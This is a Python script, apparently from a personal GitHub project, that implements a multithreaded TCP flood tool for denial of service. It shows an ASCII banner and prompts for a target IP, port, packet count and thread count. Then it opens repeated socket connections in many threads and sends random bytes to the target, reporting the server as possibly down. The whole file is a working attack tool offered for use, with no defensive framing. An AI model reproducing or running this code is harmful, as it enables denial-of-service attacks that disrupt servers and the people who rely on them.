# _*_ coding: utf-8 _*_
# progressbar  - Text progress bar library for Python.
#TCP FLOOD
import os
import socket
import threading
import time
import random
import string
import datetime
import progressbar


# Colors
class bcolors: 
      YELLOW = '\033[33m'
      BLUE = '\033[32m'
      
    
# CLEAR
os.system("clear")
print("""
\033[33m                               ╔╗                   ╔╗
\033[33m                               ║║                   ║║
\033[32m      ╔═══════╗╔═════╗╔═════╗\033[33m╔═════╗║║╔═════╗╔═════╗╔════╝║
\033[32m          ║║   ║║     ║║    ║\033[33m║║     ║║║║   ║║║║   ║║║║   ║║
\033[32m          ║║   ║║     ║║    ║\033[33m║║     ║║║║   ║║║║   ║║║║   ║║
\033[32m          ║║   ║║     ║╔════╝\033[33m║╔════ ║║║║   ║║║║   ║║║║   ║║
\033[32m          ╚╝   ╚═════╝╚╝\033[33m     ╚╝     ╚╝╚═════╝╚═════╝╚═════╝
\033[95m
\033[37m     ╔═════════════════════════════════════════════════════╗
\033[37m     ║\033[34m Author By: KunFay/https://github.com/KunFay99    \033[37m   ║
\033[37m     ╚═════════════════════════════════════════════════════╝
""")
print("\033[94m______________________")
ip = str(input("\033[92m⟩⟩ IP Target : "))
print("\033[94m______________________")
port = int(input("\033[92m⟩⟩ Port : "))
print("\033[94m______________________")
packs = int(input("\033[92m⟩⟩ Packets{0} : "))
print("\033[94m______________________")
thread = int(input("\033[92m⟩⟩ Threads : "))
print("\033[94m______________________")
time.sleep(5),
print("\033[37m----->25% "),
time.sleep(5),
print("\033[32m------->50% "),
time.sleep(5),
print("\033[4m---------->75%  "),
time.sleep(5),
print("\033[1m------------->100%"),
time.sleep(5),
print("\033[33m  B I S M I L L A H...."),
time.sleep(5),  
def animated_marker():
    widgets = ['\033[94mLoading: progressbar.AnimatedMaker()\033[0m']
    bar = progressbar.ProgressBar(widgets=widgets).start()
      
    for i in range(50):
        time.sleep(0.1)
        bar.update(i)
          
animated_marker()

def start():
  r = random._urandom(10)
  u = int(0)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(r)
      for i in range(packs):
        s.send(r)
        u += 1
        print("\033[34m[" +str(u)+ "]  \033[32mFlo0d\033[33mTCP  \033[31mTarget\033[37mIP\033[1;35m::: \033[0;37m" +ip+ "  \033[0m")

    except:
        s.close()
        print("\033[97m[" +str(u)+ "] \033[32mFlood\033[33mTCP  \033[38mServer/IP\033[93m::: \033[32mMeybe\033[33mDown \033[0m")
for x in range(thread):
  thred = threading.Thread(target=start)
  thred.start()
